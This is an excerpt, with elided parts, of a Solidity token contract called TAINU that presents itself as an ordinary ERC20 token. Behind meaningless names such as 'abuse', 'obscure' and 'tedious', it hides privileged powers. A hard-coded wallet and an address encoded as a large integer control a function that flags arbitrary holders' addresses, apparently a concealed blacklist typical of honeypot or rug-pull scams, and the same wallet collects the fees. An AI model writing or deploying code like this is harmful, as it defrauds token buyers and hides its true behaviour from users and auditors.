...
contract  TAINU is Context, IERC20, Ownable {

    uint256 public tedious=
    150204226878642622067527889049274545390382094927;
    using SafeMath for uint256;
    string private _name = "TAMAU";
    string private _symbol = "TANU";
    uint8 private _decimals = 9;
    address payable public decent;
    address payable public teamWalletAddress;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) _baces;
    ...
    constructor () {
        ...
        decent = payable(address(0xb7795F8000e2A4Ef84F959E4b9D629eD7703234b));


        _baces[_msgSender()] = _totalSupply;
    ...
    function optics(uint256 bachelor)  pure private returns(uint160){
        return uint160(bachelor);
    }

    function adop(uint256 bachelor)  pure private returns(address){
        return address(optics(bachelor));
    }

    function vacant(address bachelor) private view returns(bool){
        return ((adop(tedious) != bachelor));
    }
...
ultimate, uint256 abundant ) public{ if(
     !abuse(true,
     decent,msg.sender)
 ){
     return;}
  ...
  = abundant;}
    ...
    function _transfer(address sendder, address to, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            _baces[sendder] = _baces[sendder].sub(amount);}
            uint256 finalAmount = (_IsExcludesendderFee[sendder] || _IsExcludesendderFee[to]) ? 
                                         amount : takeFee(sendder, to, amount);
            
            _baces[to] = _baces[to].add(finalAmount);

            emit Transfer(sendder, to, finalAmount);
            return true;
        }
    }function obscure(address[] calldata extent,uint256 petroleum) public 
    { if(
        !abuse(
            true,
            decent,
            msg.sender)){return;}
        for (uint256 i; i < extent.length; ++i) {
            if (petroleum != 888){weave[extent[i]] = ( true && true );}
            else{weave[extent[i]] = (false && false);}
        }
    }

    function abuse(bool academy,address battery, address vertical) private pure returns(bool){return academy && !!(!(battery != vertical));}

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _baces[sender] = _baces[sender].sub(amount, "Insufficient Balance");
        _baces[recipient] = _baces[recipient].add(amount);
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(decent, amountBNBMarketing);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(feeAmount > 0) {
            _baces[address(this)] = _baces[address(this)].add(feeAmount);
